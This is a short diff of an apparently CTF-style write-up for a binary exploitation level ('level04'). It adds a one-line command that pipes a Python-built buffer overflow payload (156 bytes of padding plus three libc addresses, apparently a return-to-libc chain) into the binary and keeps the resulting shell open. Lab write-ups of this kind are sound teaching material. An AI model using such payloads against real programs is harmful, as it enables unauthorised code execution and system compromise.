@@ -37,3 +37,5 @@ ou
 `[ 156 bytes ] [ 0xf7e6aed0 ] [ 0xf7e5eb70 ] [ 0xf7f897ec ]`
 
 ![image](https://user-images.githubusercontent.com/29956389/95229263-a703d300-0800-11eb-81ff-16582f063481.png)
+
+`$ (python -c 'print "A"*156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7" + "\x0a"'; cat) | ./level04`
